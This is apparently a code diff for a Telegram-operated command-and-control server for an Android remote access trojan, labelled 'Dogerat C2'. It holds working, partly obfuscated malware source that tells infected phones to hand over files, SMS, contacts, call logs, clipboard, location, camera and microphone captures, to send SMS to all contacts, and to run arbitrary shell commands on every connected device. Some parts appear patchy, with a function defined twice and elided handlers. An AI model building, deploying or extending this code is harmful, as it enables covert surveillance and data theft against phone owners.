+function handleFileList(uuid, path, files) {
+  const client = appClients.get(uuid);
+  if (!client) return;
+
+  let keyboard = [];
+  let text = `📁 <b>File Manager - ${client.model}</b>\n\n`;
+  text += `📍 <b>Current Path:</b> <code>${path}</code>\n\n`;
+
+  files.forEach(file => {
+    const size = file.isDir ? "📁 Folder" : `📄 ${formatFileSize(file.size)}`;
+    const emoji = file.isDir ? "📁" : getFileEmoji(file.name);
+    
+    text += `${emoji} <code>${file.name}</code> ${size}\n`;
+    
+    if (file.isDir) {
+      keyboard.push([{ text: `${emoji} ${file.name}`, callback_data: `fm_open:${uuid}:${path}/${file.name}` }]);
+    } else {
+      keyboard.push([{ text: `${emoji} ${file.name} (${formatFileSize(file.size)})`, callback_data: `fm_download:${uuid}:${path}/${file.name}` }]);
     }
-}, 5000)
-appServer.listen(process.env.PORT || 8999);
+  });
+
+  // Add navigation buttons
+  keyboard.push([{ text: "↩️ Back", callback_data: `fm_back:${uuid}:${path}` }]);
+  keyboard.push([{ text: "🏠 Home", callback_data: `fm_home:${uuid}` }]);
+  keyboard.push([{ text: "🔄 Refresh", callback_data: `fm_refresh:${uuid}:${path}` }]);
+
+  appBot.sendMessage(id, text, {
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: keyboard.slice(0, 10) } // Telegram limit
+  });
+}
+
+function formatFileSize(bytes) {
+  if (bytes === 0) return '0 Bytes';
+  const k = 1024;
+  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+function getFileEmoji(filename) {
+  const ext = path.extname(filename).toLowerCase();
+  const icons = {
+    '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️',
+    '.mp4': '🎥', '.avi': '🎥', '.mkv': '🎥',
+    '.mp3': '🎵', '.wav': '🎵', '.flac': '🎵',
+    '.pdf': '📄', '.doc': '📄', '.txt': '📄',
+    '.apk': '📱'
+  };
+  return icons[ext] || '📄';
+}
+
+// Continue with bot handlers in PART 2...
+appBot.on("callback_query", _0x425827 => {
+  const _0x440ba5 = _0x425827.message;
+  const _0x9f09ec = _0x425827.data;
+  const _0x2f3f8b = _0x9f09ec.split(":")[0];
+  const _0x39894d = _0x9f09ec.split(":")[1]; // UUID
+  
+  // 🔥 NEW FEATURE 1: FILE MANAGER
+  if (_0x2f3f8b === "file_manager") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send("file_manager:/"); // Start from root
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, "📁 Loading file manager...");
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+  }
+
+  // 🔥 NEW FEATURE 2: NOTIFICATION CONTROL
+  if (_0x2f3f8b === "notification_off") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send("notification_off");
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, "🔇 Notifications OFF");
+    appBot.editMessageText(`✅ <b>Notifications Disabled</b> on ${_0x39894d}`, {
+      chat_id: id,
+      message_id: _0x440ba5.message_id,
+      parse_mode: "HTML"
+    });
+  }
+
+  if (_0x2f3f8b === "notification_on") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send("notification_on");
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, "🔔 Notifications ON");
+    appBot.editMessageText(`✅ <b>Notifications Enabled</b> on ${_0x39894d}`, {
+      chat_id: id,
+      message_id: _0x440ba5.message_id,
+      parse_mode: "HTML"
+    });
+  }
+
+  // 🔥 FILE MANAGER NAVIGATION
+  if (_0x2f3f8b === "fm_open") {
+    const path = _0x9f09ec.split(":")[2];
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send(`file_manager:${path}`);
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, `📁 Opening ${path}`);
+  }
+
+  if (_0x2f3f8b === "fm_download") {
+    const path = _0x9f09ec.split(":")[2];
+    const client = appClients.get(_0x39894d);
+    appBot.answerCallbackQuery(_0x425827.id, `📥 Downloading ${path}`);
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send(`file:${path}`);
+      }
+    });
+    appBot.editMessageText(`📥 <b>Downloading:</b> <code>${path}</code>\n\nDevice: ${client.model}`, {
+      chat_id: id,
+      message_id: _0x440ba5.message_id,
+      parse_mode: "HTML"
+    });
+  }
+
+  if (_0x2f3f8b === "fm_back") {
+    const path = _0x9f09ec.split(":")[2];
+    const parentPath = path.split('/').slice(0, -1).join('/') || '/';
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send(`file_manager:${parentPath}`);
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, "↩️ Going back...");
+  }
+
+  if (_0x2f3f8b === "fm_home") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send("file_manager:/");
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, "🏠 Going home...");
+  }
+
+  if (_0x2f3f8b === "fm_refresh") {
+    const path = _0x9f09ec.split(":")[2];
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) {
+        client.send(`file_manager:${path}`);
+      }
+    });
+    appBot.answerCallbackQuery(_0x425827.id, "🔄 Refreshing...");
+  }
+
+  // ORIGINAL DEVICE MENU (Updated with NEW buttons)
+  if (_0x2f3f8b === "device") {
+    const client = appClients.get(_0x39894d);
+    appBot.editMessageText("°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>" + (client?.model || _0x39894d) + "</b>", {
+      chat_id: id,
+      message_id: _0x440ba5.message_id,
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 𝘼𝙥𝙥𝙨", callback_data: "apps:" + _0x39894d }, 
+           { text: "ℹ️ 𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", callback_data: "device_info:" + _0x39894d }],
+          
+          [{ text: "🗂️ 𝗙𝗜𝗟𝗘 𝗠𝗔𝗡𝗔𝗚𝗘𝗥", callback_data: "file_manager:" + _0x39894d }, 
+           { text: "🔔 𝗧𝗢𝗚𝗚𝗟𝗘 𝗡𝗢𝗧𝗜𝗙", callback_data: "notification_toggle:" + _0x39894d }],
+          
+          [{ text: "📁 𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", callback_data: "file:" + _0x39894d }, 
+           { text: "🗑️ 𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", callback_data: "delete_file:" + _0x39894d }],
+          
+          [{ text: "📋 𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", callback_data: "clipboard:" + _0x39894d }, 
+           { text: "🎤 𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", callback_data: "microphone:" + _0x39894d }],
+          
+          [{ text: "📷 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_main:" + _0x39894d }, 
+           { text: "🤳 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_selfie:" + _0x39894d }],
+          
+          [{ text: "📍 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "location:" + _0x39894d }, 
+           { text: "🍞 𝙏𝙤𝙖𝙨𝙩", callback_data: "toast:" + _0x39894d }],
+          
+          [{ text: "📞 𝘾𝙖𝙡𝙡𝙨", callback_data: "calls:" + _0x39894d }, 
+           { text: "👥 𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: "contacts:" + _0x39894d }],
+          
+          [{ text: "📳 𝙑𝙞𝙗𝙧𝙖𝙩𝙚", callback_data: "vibrate:" + _0x39894d }, 
+           { text: "🔔 𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "show_notification:" + _0x39894d }],
+          
+          [{ text: "💬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", callback_data: "messages:" + _0x39894d }, 
+           { text: "📤 𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", callback_data: "send_message:" + _0x39894d }],
+          
+          [{ text: "🎵 𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", callback_data: "play_audio:" + _0x39894d }, 
+           { text: "⏹️ 𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", callback_data: "stop_audio:" + _0x39894d }],
+          
+          [{ text: "📨 𝙎𝙚𝙣𝙙 𝙩𝙤 𝘼𝙇𝙇 𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎", callback_data: "send_message_to_all:" + _0x39894d }]
+        ]
+      },
+      parse_mode: "HTML"
+    });
+    return;
+  }
+
+  // Notification Toggle (shows OFF/ON buttons)
+  if (_0x2f3f8b === "notification_toggle") {
+    appBot.editMessageText("🔔 <b>Notification Control</b>", {
+      chat_id: id,
+      message_id: _0x440ba5.message_id,
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "🔇 𝗢𝗙𝗙", callback_data: "notification_off:" + _0x39894d }],
+          [{ text: "🔔 𝗢𝗡", callback_data: "notification_on:" + _0x39894d }]
+        ]
+      },
+      parse_mode: "HTML"
+    });
+    return;
+  }
+
+  // Continue with all original handlers...
+  if (_0x2f3f8b === "calls") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("calls");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "contacts") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("contacts");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "messages") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("messages");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "apps") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("apps");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "device_info") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("device_info");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "clipboard") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("clipboard");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  // Continue with camera, location, etc. handlers (same as original)...
+  if (_0x2f3f8b === "camera_main") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("camera_main");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "camera_selfie") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("camera_selfie");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "location") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("location");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "vibrate") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("vibrate");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  if (_0x2f3f8b === "stop_audio") {
+    appSocket.clients.forEach(client => {
+      if (client.uuid === _0x39894d) client.send("stop_audio");
+    });
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    sendProcessingMessage();
+  }
+
+  // Input handlers (unchanged)
+  if (_0x2f3f8b === "send_message") {
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎", {
+      reply_markup: { force_reply: true }
+    });
+    currentUuid = _0x39894d;
+  }
+
+  // ... (all other input handlers remain same)
+});
+
+function sendProcessingMessage() {
+  appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
+    parse_mode: "HTML",
+    reply_markup: {
+      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+      resize_keyboard: true
+    }
+  });
+}
+// Message Handlers (Complete)
+appBot.on("message", _0x4e5c2a => {
+  const _0x1b3f4d = _0x4e5c2a.text;
+  const _0x2a8f6b = _0x4e5c2a.message_id;
+  
+  if (_0x4e5c2a.reply_to_message) {
+    if (currentUuid) {
+      appSocket.clients.forEach(client => {
+        if (client.uuid === currentUuid) {
+          client.send("sms:" + _0x4e5c2a.reply_to_message.text + ":" + _0x1b3f4d);
+        }
+      });
+      appBot.deleteMessage(id, _0x4e5c2a.message_id);
+      appBot.deleteMessage(id, _0x4e5c2a.reply_to_message.message_id);
+      sendProcessingMessage();
+    }
+    return;
+  }
+
+  if (_0x1b3f4d.includes("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨")) {
+    let _0x4b2e1f = "📱 <b>Connected Devices:</b>\n\n";
+    let _0x3d8f2a = [];
+    appClients.forEach((client, uuid) => {
+      _0x4b2e1f += `• <code>${uuid}</code> - ${client.model}\n`;
+      _0x3d8f2a.push({ text: client.model, callback_data: "device:" + uuid });
+    });
+    _0x4b2e1f += `\n<b>Total: ${appClients.size}</b>`;
+    
+    const inlineKeyboard = [];
+    for (let i = 0; i < _0x3d8f2a.length; i += 2) {
+      inlineKeyboard.push(_0x3d8f2a.slice(i, i + 2));
+    }
+    
+    appBot.sendMessage(id, _0x4b2e1f, {
+      parse_mode: "HTML",
+      reply_markup: { inline_keyboard: inlineKeyboard }
+    });
+    appBot.deleteMessage(id, _0x4e5c2a.message_id);
+    return;
+  }
+
+  if (_0x1b3f4d.includes("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙")) {
+    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚", {
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "🐚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙎𝙝𝙚𝙡𝙡", callback_data: "cmdshell" },
+          { text: "📱 𝘼𝙡𝙡 𝘿𝙚𝙫𝙞𝙘𝙚𝙨", callback_data: "all_devices" }
+        ]]
+      }
+    });
+    appBot.deleteMessage(id, _0x4e5c2a.message_id);
+    return;
+  }
+
+  // Execute command on ALL devices
+  appSocket.clients.forEach(client => {
+    client.send("cmd:" + _0x1b3f4d);
+  });
+  
+  appBot.sendMessage(id, `°• 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙚𝙭𝙚𝙘𝙪𝙩𝙚𝙙 𝙤𝙣 𝘼𝙇𝙇 𝙙𝙚𝙫𝙞𝙘𝙚𝙨:\n\n<code>${_0x1b3f4d}</code>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+      resize_keyboard: true
+    }
+  });
+  appBot.deleteMessage(id, _0x4e5c2a.message_id);
+});
+
+// Utility Functions
+function sendProcessingMessage() {
+  appBot.sendMessage(id, "⏳ <b>Processing request...</b>", {
+    reply_markup: {
+      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+      resize_keyboard: true
+    },
+    parse_mode: "HTML"
+  });
+}
+
+// Server Start
+const server = app.listen(80, () => {
+  console.log("🚀 Dogerat C2 Server Started on Port 80");
+});
+
+// Cleanup on exit
+process.on('SIGINT', () => {
+  server.close();
+  process.exit();
+});
